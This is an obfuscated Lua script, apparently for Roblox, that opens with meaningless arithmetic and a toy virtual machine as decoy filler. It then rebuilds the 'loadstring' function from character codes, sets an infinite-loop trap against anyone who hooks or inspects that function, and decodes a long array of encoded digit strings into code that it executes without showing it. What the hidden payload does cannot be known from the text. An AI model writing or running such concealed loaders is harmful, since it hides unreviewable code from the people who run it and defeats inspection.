local function a(b) return b + 2 end local function c(d) return d * 2 end local function e(f, g) return f - g end local function h(i, j) return i / j end local function k(l) return l ^ 2 end local function m(n) return n % 3 end local p = 5 local q = a(p) local r = c(q) local s = e(r, p) local t = h(s, p) local u = k(t) local v = m(u) local x = 10 local y = a(x) local z = e(y, 4) local w = c(z) local j1 = h(w, 3) local k1 = m(j1) local function l1() return p * q end local function l2() return e(r, s) end local function l3() return t + u end local function l4() return v - w end local z1 = l1() local z2 = l2() local z3 = l3() local z4 = l4() local t1 = a(z1) local t2 = c(z2) local t3 = e(z3, z4) local t4 = h(t1, t2) local t5 = m(t3) local function n1(x) return x * 4 end local function n2(y) return y + 5 end local function n3(z) return z - 10 end local result1 = n1(t5) local result2 = n2(result1) local result3 = n3(result2) local temp = result3 + 100 local final = temp / 10 local vm = {} vm.registers = {A = 0, B = 0, C = 0, D = 0} vm.memory = {} vm.stack = {} vm.pc = 1 vm.code = {} local function op_add(r1, r2) return r1 + r2 end local function op_sub(r1, r2) return r1 - r2 end local function op_mul(r1, r2) return r1 * r2 end local function op_div(r1, r2) if r2 == 0 then return 0 else return r1 / r2 end end local function dummy1(a, b) local c = a + b local d = a * b local e = c - d local f = h(c, b + 1) return f + d end local function dummy2(x) local y = x * 2 local z = x - y return z + a(x) end local instr_set = {} instr_set["ADD"] = function(reg, val) vm.registers[reg] = vm.registers[reg] + val end instr_set["SUB"] = function(reg, val) vm.registers[reg] = vm.registers[reg] - val end instr_set["MUL"] = function(reg, val) vm.registers[reg] = vm.registers[reg] * val end instr_set["DIV"] = function(reg, val) vm.registers[reg] = vm.registers[reg] / val end local program = { {"ADD", "A", 5}, {"MUL", "B", 3}, {"SUB", "C", 2}, {"DIV", "D", 4}, {"ADD", "A", 7}, {"MUL", "C", 2}, {"SUB", "B", 1}, {"DIV", "A", 2}, {"ADD", "D", 10}, {"SUB", "C", 3}, {"MUL", "B", 4}, {"DIV", "D", 2} } local function load_program(prog) for i = 1, #prog do vm.code[i] = prog[i] end end local function execute_program() for i = 1, #vm.code do local inst = vm.code[i] local op = inst[1] local reg = inst[2] local val = inst[3] if instr_set[op] then instr_set[op](reg, val) end end end local function vm_initialization() vm.registers.A = final vm.registers.B = p + x vm.registers.C = z1 vm.registers.D = t4 for i = 1, 50 do vm.stack[i] = (i * 3) % 7 end for i = 1, 100 do vm.memory[i] = i % 5 end end local function vm_loop() local count = 0 while count < 100 do vm.pc = vm.pc + 1 vm.registers.A = op_add(vm.registers.A, dummy1(count, vm.pc)) vm.registers.B = op_sub(vm.registers.B, dummy2(count)) vm.registers.C = op_mul(vm.registers.C, 1.001) vm.registers.D = op_div(vm.registers.D, 1.002) count = count + 1 end end local function auxiliary() local arr = {} for i = 1, 30 do arr[i] = i * a(i) - c(i) end local sum = 0 for i = 1, #arr do sum = sum + arr[i] end local prod = 1 for i = 1, #arr do prod = op_mul(prod, (arr[i] % 5 + 1)) end local mix = dummy1(sum, prod) for i = 1, 20 do mix = op_add(mix, dummy2(i)) end vm.registers.A = vm.registers.A + mix end vm_initialization() load_program(program) execute_program() vm_loop() auxiliary() local _____I_z = {v__qqzp_ = {___f_z_e = table.concat},f__f__lf = {e__vl_xp = loadstring},fqll_f__ = {_____n__ = tonumber},__pzvfpe = {_q_l_xn_ = string.char},I_lq_xe_ = { xnq_xzpz = setmetatable}, z_pvfele = { xz__l__x = nil} } local vvxevqlx = _____I_z.v__qqzp_.___f_z_e local qxfqffxl = _____I_z.f__f__lf.e__vl_xp local p_lx__pn = _____I_z.fqll_f__._____n__ local q___q_x_ = _____I_z.__pzvfpe._q_l_xn_ local __x___xn = _____I_z.I_lq_xe_.xnq_xzpz local xf___v__ = _____I_z.z_pvfele.xz__l__x local vl______ = q___q_x_(108, 111, 97, 100, 115, 116, 114, 105, 110, 103) function _pI__vlp(_x_pl_xf) local luacrypt_so_tuff = "ts pmo icl dnt pmo wrd2foenem" local pqe__xx_ = _x_pl_xf local _v_e_f__ = setclipboard local __x__x__ = toclipboard local function Iveenp_p(__xqxqz_) return function() return __xqxqz_ end end local _q____z_ = warn local function __z_____(__z_Il_q) return Iveenp_p(__z_Il_q)() end local qx__z_nl = error local function ____pp_e() while true do end end local _z_f___p = print local function _zqe_fz_() return __z_____(math.random(100, 999)) end local ___f__q_ = game local ___ef_eI = {qxfqffxl,___f__q_,_z_f___p,_q____z_,qx__z_nl,_v_e_f__,__x__x__} if ___ef_eI[1] == ___ef_eI[3] or ___ef_eI[1] == ___ef_eI[4] or ___ef_eI[1] == ___ef_eI[5] or ___ef_eI[1] == ___ef_eI[6] or ___ef_eI[1] == ___ef_eI[7] then ____pp_e() end local function v_z__lz_(xq_l_nf_) local function I_lqfI_x(plxfxxxl) return q___q_x_(p_lx__pn(plxfxxxl, 2)) end _zqe_fz_() local ___xxvzv = xq_l_nf_:gsub("[^01]", "") return ___xxvzv:gsub("(".. ("[01]"):rep(8) .. ")", I_lqfI_x) end local ___exfp_ = v_z__lz_(pqe__xx_) local sporty = game:GetService("Workspace") local function __v_____(__Iv_zfv) local ___e_zle, _xxzxlp_, x__ve___, __z__vpI = "l", "o", "a", "d" local vzxv____, xffx____, n_q_I__n, q___x_ex = "s", "t", "r", "i" local _en___n_, z__vIn_f = "n", "g" local function _____q_p(...) local z_______, ___f__q_ = {...}, "" for i = 1, #z_______ do ___f__q_ = ___f__q_ .. z_______[i] end return ___f__q_ end local ____pq__ = _____q_p(___e_zle, _xxzxlp_, x__ve___, __z__vpI, vzxv____, xffx____, n_q_I__n, q___x_ex, _en___n_, z__vIn_f) local __n____l = ("%s"):format(____pq__) local xx_pz__v, pzzn_zf_ = pcall(qxfqffxl(__Iv_zfv)) local q_pxx_I_, __zzz_zx, ___zevI_ = "WF__GWS_SWX_DWWFV_S__SS__S___S_DVG__DW___WSF__S_G_", "__R__SV__SSRF_F_____XF_____VWGFFFDW_V__F__DF_GDS_Q", "_SV___D_F_RXF___WR__Q_ZF___Q_WXV_G___FS_GFW__W__FG" local ef__lIn_ = (2 * 5 / 10 + 3 - 3) ^ 1 if not xx_pz__v then local p__qxll_ = { q_pxx_I_, __zzz_zx, ___zevI_, ef__lIn_ } for i = 1, # p__qxll_ do p__qxll_[i] = p__qxll_[i] .. "_extra" end end return pzzn_zf_ end __v_____(___exfp_, _____I_z.z_pvfele.xz__l__x); _zqe_fz_() local zx___n_x = __x___xn( { ________ = { _____pxx = { __q__nle, I_nI__p_, I_Ieq_x_ }, ze_n____ = function() for _x____lv = 1, 50 do local ___zqe_p = _x____lv * 2 local _____I__ = {_x____lv, _x____lv * 10, _x____lv * 100} end return _____I_z.z_pvfele.xz__l__x end }, z____e_p = { [true] = { function() for lzqx___e = 1, 100 do local ___xf_e_ = lzqx___e * lzqx___e if ___xf_e_ > 100 then break end end end }, [false] = { { function() return false end }, function() for x_xfe_I_ = 1, 10 do local _x______ = x_xfe_I_ * 2 end end } } }, { __index = function(_, _I_zq___) local _f___xnp = "Lua Crypt1" if _I_zq___ == "print" then for n__I__lx = 1, 100 do local __z__zq_ = n__I__lx * n__I__lx + n__I__lx end return print elseif _I_zq___ == "warn" then for x_nxn__x = 1, 50 do local l_xzqexx = x_nxn__x * 3 if l_xzqexx == 150 then return warn end end end return _____I_z.z_pvfele.xz__l__x end } ) end _pI__vlp(vvxevqlx({'072764152279137335099369136795179396026334065694','022475154724173737049476163295144473173973194949','025654176264174436065943044354025629095449192772','077549162662194547054472044925179473034229073427','074653126965143437123364093973026459163695143645','063395142493167332167563044372174452062496093956','044536156494143237195242045494024424199466073943','069995176997196553097753137457034565036246165634','066642177422167226027343135255176522139945043566','037562126494143962035766053643166293132639123392','033562047355166444046437147256062395077666095372','093792147253152599079722093575144445139632169644','032444196639137595042923029653066295039937179459','062269152953126796067525143525166446053497164493','072377147332177955056653079559146752062252149693','095452053573196592175496193543033546165359032527','063999143226096293063294144936066626099575026742','093757159739124593195535062355156394047367094962','029349137267179272125579069334157399093296042525','047794135594165774139333025924035634045762069647','027776162267043572073392034526169492147365135653','022699156623147655099769092736123645034649127729','045526194244172999172766095536142223049629029249','093632065797137556052239126725099494065736029557','062394039994132642097635079996067264175779036423','042364179434127722032639193336054342045647055555','029944164347176326136374037222167234054964079239','096462176952129569139942099479165927079275035697','079459167679135592177796072652096945046776029943','035469193942175499155676049493063925134297133969','054293053332126279147265137273097253193756073427','077939099965136345043526143644146244153293163627','042329064574154295095935152474145722157249194352','049425159937127945199472079296073799093324062573','029357174794133644075642047559047427033733156463','092957172964127475124474065432039494169379162654','095322177997195732172453065763166566096737063996','026929175462134723032467076334155526025372145743','063923123236179356099223097724053696153536045462','032433175343155972063337134623035573059234169772','074443175533133543039979144663145377143392074437','094924044954174527046544127964149755192352075545','043527193762165742095323096645097333144697132937','042599193963166972046657167355167792197975146629','043364167592136669049669136973196979094665163223','053979075357137337057622142337123645167965144929','099973125633132623147237022644057542136466056573','053465173477152377055466042474054296094722135472','043943126795134745164935053423197953126993155229','064597067977153637097624176497155974135979126957','033323166546055263152435064995133923034739047929','049545194723072352095576072629197569199674199767','052297193647062553056757067624192377077364044325','033542193949077664077936122673123259166562057926','093323124747035775053546122539193926073657164376','026244172245067565149545044233155643136495062992','052629152445167922179662192992045564053453079246','022496193372059243097625024954099432076593126297','022654036262137533022934034932076272122743037972','067246036357199353043427154469062294067695126645','094294065235134546055394146426049369076229173633','027967055977154273069953163932097525046966059352','062467044347126327045699167363027273053623122279'}))
